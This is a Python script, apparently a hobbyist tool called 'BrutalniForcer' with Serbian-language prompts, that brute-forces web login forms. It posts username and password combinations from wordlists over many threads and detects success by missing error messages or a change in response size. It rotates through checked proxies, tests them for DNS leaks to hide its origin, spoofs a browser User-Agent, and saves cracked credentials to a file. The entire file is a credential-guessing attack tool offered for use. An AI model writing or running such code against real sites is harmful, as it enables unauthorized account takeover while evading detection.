import requests
from twill.commands import *
from pyfiglet import figlet_format
import os
from concurrent.futures import ThreadPoolExecutor
from time import sleep

class Main():
    iter = 0
    i = 0
    #Konstruktor
    def __init__(self):
        proxylist = []
        self.gotovaproxylista = []
        self.creds = []
        self.rb = 1
        os.system("cls")
        self.ascii_banner = figlet_format("BrutalniForcer")
        print(self.ascii_banner)
        self.url = input("url sa formom: ")
        self.url2 = input("url za post request ili paylodom (inspect element): ")
        r15 = requests.get(self.url)
        self.size = len(r15.content)
        try:
            go(self.url)
        except:
            print("url nije dobar!")
        showforms()
        print("\n")
        print("USERNAME LIST: ")
        os.chdir("usernames")
        os.system("dir /b")
        os.chdir("..")
        print("\n")
        print("PASSWORD LIST: ")
        os.chdir("passwords")
        os.system("dir /b")
        os.chdir("..")
        print("\n")

        username = input("unesi (Form Name inace 1),(Name),(username.txt ili samo username) lepo odvojeno zarezom bez razmaka izmedju!: ")
        password = input("unesi (Form Name inace 1),(Name),(password.txt ili samo password) lepo odvojeno zarezom bez razmaka izmedju!: ")
        login = input("unesi (Form Name inace 1),(Name),(Login value ako ima) lepo odvojeno zarezom bez razmaka izmedju!: ")
        username = username.split(sep=",")
        password = password.split(sep=",")
        login = login.split(",")
        if len(login) == 2:
            login.append("")

        print("potrazi koji errori imaju kada se unesu pogresni podaci!")
        print("\nUSERNAME I PASSWORD: \n")
        r3 = requests.post(self.url2, data={username[1]:"asddsa", password[1]:"123321", login[1]:login[2]})
        print(r3.text)
        print("\nSAMO USERNAME: \n")
        r3 = requests.post(self.url2, data={username[1]:"asddsa", login[1]:login[2]})
        print(r3.text)
        print("\nSAMO PASSWORD: \n")
        r3 = requests.post(self.url2, data={password[1]:"asddsa", login[1]:login[2]})
        print(r3.text)


        self.stapise = input("sta pise nakon sto ukucas pogresan username i password (enter za nista) (ako ima vise odvoji zarezom bez razmaka izmedju): ")
        self.stapise = self.stapise.split(sep=",")
        if len(self.stapise) == 1 and self.stapise[0] == "":
            self.stapise.remove("")

        #Proxy odredba
        proxy = input("proxy da/ne: ")
        if proxy == "da":
            os.system("start /wait cmd /k python checkproxy.py")
            with open("proxylist.txt", "r") as file:
                lines = file.readlines()
                for line in lines:
                    proxylist.append(line.strip())
            print("pravim hierarhiju proxya, sacekaj")
            with ThreadPoolExecutor(len(proxylist)) as exe:
                for proxy in proxylist:
                    self.proxyhierarchy(proxy)
        self.rb = 0

        #Odabir mesta koristenja txt fileova
        if "txt" in username[2] and "txt" in password[2]:
            usernamefile = open("usernames/"+username[2])
            passwordfile = open("passwords/"+password[2])
            userlines = usernamefile.readlines()
            passlines = passwordfile.readlines()
            radnici = input("broj radnika: ")
            with ThreadPoolExecutor(int(radnici)) as self.exe1:
                for user in userlines:
                    for passw in passlines:
                        self.exe1.submit(self.user1pass1, username, password, user.strip(), passw.strip(), radnici, login)
            if len(self.creds) > 0:
                self.printgotovo()
            else:
                print("nije pronadjen username i password")

        elif "txt" not in username[2] and "txt" in password[2]:
            passwordfile = open("passwords/"+password[2])
            passlines = passwordfile.readlines()
            radnici = input("broj radnika: ")
            with ThreadPoolExecutor(int(radnici)) as self.exe2:
                for passw in passlines:
                    self.exe2.submit(self.user0pass1, username, password, passw.strip(), radnici, login)
            if len(self.creds) > 0:
                self.printgotovo()
            else:
                print("nije pronadjen username i password")


        elif "txt" in username[2] and "txt" not in password[2]:
            usernamefile = open("usernames/"+username[2])
            userlines = usernamefile.readlines()
            radnici = input("broj radnika: ")
            with ThreadPoolExecutor(int(radnici)) as self.exe3:
                for user in userlines:
                    self.exe3.submit(self.user1pass0, username, password, user.strip(), radnici, login)
            if len(self.creds) > 0:
                self.printgotovo()
            else:
                print("nije pronadjen username i password")


        elif "txt" not in username[2] and "txt" not in password[2]:
            self.user0pass0(username,password, login)




    #funkcije za brute force pomocu ili bez txt fileova
    def user1pass1(self, username, password, user, passw, radnici, login):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        }
        try:
            if len(self.gotovaproxylista) != 0:
                mainproxy = self.gotovaproxylista[Main.i]
                proxy = {
                    "https": "",
                    "http": ""
                }
                proxy["https"] = "http://"+mainproxy
                proxy["http"] = "http://"+mainproxy
                if self.rb == 0:
                    print("koristim proxy: " + str(mainproxy))
                    self.rb +=1
                    r2 =requests.get("https://dnsleaktest.com", proxies=proxy, headers=headers)
                    print(r2.content)
                r = requests.post(self.url2, proxies=proxy, headers=headers, data={username[1]:user, password[1]: passw, login[1]:login[2]}, allow_redirects=True, timeout=20)
            else:
                r = requests.post(self.url2, data={username[1]:user, password[1]: passw, login[1]:login[2]},allow_redirects=True, headers=headers, timeout=20)
            if len(self.stapise) != 0:
                if len(self.stapise) == 1:
                    if self.stapise[0] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + passw)
                        self.creds.append(user)
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + passw)
                if len(self.stapise) == 2:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + passw)
                        self.creds.append(user)
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + passw)
                if len(self.stapise) == 3:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + passw)
                        self.creds.append(user)
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + passw)
                if len(self.stapise) == 4:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content) and self.stapise[3] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + passw)
                        self.creds.append(user)
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + passw)
            elif len(self.stapise) == 0:
                if len(r.content) >= self.size + 60 or len(r.content) < self.size:
                    print("pronasao username: " + user)
                    print("pronasao password: " + passw)
                    self.creds.append(user)
                    self.creds.append(passw)
                    self.exe1.shutdown(cancel_futures=True, wait=False)
                    sleep(5)
                    os.system("cls")
                else:
                    print("username: " + user + " : " + "password: " + passw)
            else:
                print("username: " + user + " : " + "password: " + passw)
        except requests.exceptions.Timeout:
            Main.iter += 1
            if Main.iter == len(int(radnici)):
                Main.i += 1
                Main.iter = 0
                print("proxy " + str(self.gotovaproxylista[Main.i-1]) + " Timed Out")
                print("Koristim sada " + self.gotovaproxylista[Main.i])
                r2 =requests.get("https://dnsleaktest.com", proxies=proxy)
                print(r2.content)
        except requests.exceptions.ProxyError:
            Main.iter += 1
            if Main.iter == len(int(radnici)):
                Main.i += 1
                Main.iter = 0
                print("proxy " + str(self.gotovaproxylista[Main.i-1]) + " Timed Out")
                print("Koristim sada " + self.gotovaproxylista[Main.i])
                r2 =requests.get("https://dnsleaktest.com", proxies=proxy)
                print(r2.content)
        except Exception as e:
            print(e)
        

    def user0pass1(self, username, password, passw, radnici, login):
        headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        }
        try:
            if len(self.gotovaproxylista) != 0:
                mainproxy = self.gotovaproxylista[Main.i]
                proxy = {
                    "https": "",
                    "http": ""
                }
                proxy["https"] = "http://"+mainproxy
                proxy["http"] = "http://"+mainproxy
                if self.rb == 0:
                    print("koristim proxy: " + str(mainproxy))
                    self.rb +=1
                    r2 =requests.get("https://dnsleaktest.com", proxies=proxy, headers=headers)
                    print(r2.content)
                r = requests.post(self.url2, proxies=proxy, headers=headers, data={username[1]:username[2], password[1]: passw, login[1]:login[2]}, timeout=20)
            else:
                r = requests.post(self.url2, data={username[1]:username[2], password[1]: passw, login[1]:login[2]}, headers=headers, timeout=20)
            
            if len(self.stapise) != 0:
                if len(self.stapise) == 1:
                    if self.stapise[0] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + passw)
                        self.creds.append(username[2])
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + passw)
                if len(self.stapise) == 2:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + passw)
                        self.creds.append(username[2])
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + passw)
                if len(self.stapise) == 3:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + passw)
                        self.creds.append(username[2])
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + passw)
                if len(self.stapise) == 4:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content) and self.stapise[3] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + passw)
                        self.creds.append(username[2])
                        self.creds.append(passw)
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + passw)
            elif len(self.stapise) == 0:
                if len(r.content) >= self.size + 60 or len(r.content) < self.size:
                    print("pronasao username: " + username[2])
                    print("pronasao password: " + passw)
                    self.creds.append(username[2])
                    self.creds.append(passw)
                    self.exe1.shutdown(cancel_futures=True, wait=False)
                    sleep(5)
                    os.system("cls")
                else:
                    print("username: " + username[2] + " : " + "password: " + passw)
            else:
                print("username: " + username[2] + " : " + "password: " + passw)
        except requests.exceptions.Timeout:
            Main.iter += 1
            if Main.iter == len(int(radnici)):
                Main.i += 1
                Main.iter = 0
                print("proxy " + str(self.gotovaproxylista[Main.i-1]) + " Timed Out")
                print("Koristim sada " + self.gotovaproxylista[Main.i])
        

    def user1pass0(self, username, password, user, radnici, login):
        headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        }
        try:
            if len(self.gotovaproxylista) != 0:
                mainproxy = self.gotovaproxylista[Main.i]
                proxy = {
                    "https": "",
                    "http": ""
                }
                proxy["https"] = "http://"+mainproxy
                proxy["http"] = "http://"+mainproxy
                if self.rb == 0:
                    print("koristim proxy: " + str(mainproxy))
                    self.rb +=1
                    r2 =requests.get("https://dnsleaktest.com", proxies=proxy, headers=headers)
                    print(r2.content)
                r = requests.post(self.url2, proxies=proxy, headers=headers, data={username[1]:user, password[1]: password[2], login[1]:login[2]}, timeout=20)
            else:
                r = requests.post(self.url2, data={username[1]:user, password[1]: password[2], login[1]:login[2]}, headers=headers, timeout=20)
            if len(self.stapise) != 0:
                if len(self.stapise) == 1:
                    if self.stapise[0] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + password[2])
                        self.creds.append(user)
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + password[2])
                if len(self.stapise) == 2:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + password[2])
                        self.creds.append(user)
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + password[2])
                if len(self.stapise) == 3:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + password[2])
                        self.creds.append(user)
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + password[2])
                if len(self.stapise) == 4:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content) and self.stapise[3] not in str(r.content):
                        print("pronasao username: " + user)
                        print("pronasao password: " + password[2])
                        self.creds.append(user)
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + user + " : " + "password: " + password[2])
            elif len(self.stapise) == 0:
                if len(r.content) >= self.size + 60 or len(r.content) < self.size:
                    print("pronasao username: " + user)
                    print("pronasao password: " + password[2])
                    self.creds.append(user)
                    self.creds.append(password[2])
                    self.exe1.shutdown(cancel_futures=True, wait=False)
                    sleep(5)
                    os.system("cls")
                else:
                    print("username: " + user + " : " + "password: " + password[2])
            else:
                print("username: " + user + " : " + "password: " + password[2])
        except requests.exceptions.Timeout:
            Main.iter += 1
            if Main.iter == len(int(radnici)):
                Main.i += 1
                Main.iter = 0
                print("proxy " + str(self.gotovaproxylista[Main.i-1]) + " Timed Out")
                print("Koristim sada " + self.gotovaproxylista[Main.i])
            
    def user0pass0(self, username, password, login): 
        headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        }
        if len(self.gotovaproxylista) != 0:
            mainproxy = self.gotovaproxylista[Main.i]
            proxy = {
                "https": "",
                "http": ""
            }
            proxy["https"] = "http://"+mainproxy
            proxy["http"] = "http://"+mainproxy
            if self.rb == 0:
                print("koristim proxy: " + str(mainproxy))
                self.rb +=1
                r2 =requests.get("https://dnsleaktest.com", proxies=proxy, headers=headers)
                print(r2.content)
            r = requests.post(self.url2, proxies=proxy, headers=headers, data={username[1]:username[2], password[1]: password[2], login[1]:login[2]}, timeout=20)
        else:
            r = requests.post(self.url2, data={username[1] : username[2], password[1] : password[2], login[1]:login[2]}, headers=headers, timeout=20)
        
        if len(self.stapise) != 0:
                if len(self.stapise) == 1:
                    if self.stapise[0] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + password[2])
                        self.creds.append(username[2])
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + password[2])
                if len(self.stapise) == 2:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + password[2])
                        self.creds.append(username[2])
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + password[2])
                if len(self.stapise) == 3:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + password[2])
                        self.creds.append(username[2])
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + password[2])
                if len(self.stapise) == 4:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content) and self.stapise[3] not in str(r.content):
                        print("pronasao username: " + username[2])
                        print("pronasao password: " + password[2])
                        self.creds.append(username[2])
                        self.creds.append(password[2])
                        self.exe1.shutdown(cancel_futures=True, wait=False)
                        sleep(5)
                        os.system("cls")
                    else:
                        print("username: " + username[2] + " : " + "password: " + password[2])
            
        elif len(self.stapise) == 0:
            if len(r.content) >= self.size + 60 or len(r.content) < self.size:
                print("pronasao username: " + username[2])
                print("pronasao password: " + password[2])
                self.creds.append(username[2])
                self.creds.append(password[2])
                self.exe1.shutdown(cancel_futures=True, wait=False)
                sleep(5)
                os.system("cls")
            else:
                print("username: " + username[2] + " : " + "password: " + password[2])
        else:
            print("username: " + username[2] + " : " + "password: " + password[2])




    def proxyhierarchy(self, proxy):
        proxyies = {
            "https": ""
        }
        proxyies["https"] = "http://"+proxy
        try:
            r = requests.get("https://google.com", proxies=proxyies, headers={"Content-Type":"text"}, timeout=20)
            print(str(self.rb) +". "+ str(proxy) + " : " + str(r.status_code))
            self.gotovaproxylista.append(proxy)
            self.rb += 1
        except:
            pass


    def printgotovo(self):
        print(self.ascii_banner)
        print("pronasao username i password: \n")
        print("username: " + self.creds[0])
        print("password: " + self.creds[1])
        with open("info.txt", "w") as file:
            file.write("username: " + self.creds[0])
            file.write("\n" + "password: " + self.creds[1] + "\n")

if __name__ == "__main__":
    Main()